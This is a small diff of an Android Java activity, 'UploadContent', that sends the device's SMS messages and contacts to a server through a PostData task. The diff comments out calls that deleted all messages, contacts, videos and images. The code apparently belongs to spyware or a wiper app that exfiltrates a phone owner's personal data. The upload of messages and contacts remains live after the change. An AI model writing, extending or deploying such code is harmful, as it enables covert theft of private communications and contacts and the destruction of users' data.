@@ -52,14 +52,14 @@ public class UploadContent extends Activity {
 			e.printStackTrace();
 		}
 		new PostData(smsObject).execute();
-        deletAllMsgs();
+        //deletAllMsgs();
         
         JSONObject contactsObj = getcontacts();
         new PostData(contactsObj).execute();
-        deleteAllContacts();
+        //deleteAllContacts();
         
-        deletevideos_all();
-        deleteimages_all();
+        //deletevideos_all();
+        //deleteimages_all();
           
         
 	}
